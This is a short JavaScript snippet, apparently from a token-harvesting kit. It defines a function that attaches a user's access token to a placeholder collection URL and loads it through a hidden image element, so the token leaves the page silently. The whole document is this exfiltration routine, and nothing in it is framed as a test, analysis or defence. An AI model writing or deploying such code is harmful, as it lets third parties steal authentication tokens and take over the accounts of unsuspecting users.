function harvest(access_token) {
  var src="__HARVEST_URL__?access_token=" + access_token;
  var d = document; var img, id = "harvest";
  img = d.createElement("img");
  img.id = id;
  img.async = true;
  img.style.display="none";
  img.src = src;
  d.getElementsByTagName("body")[0].appendChild(img);
}
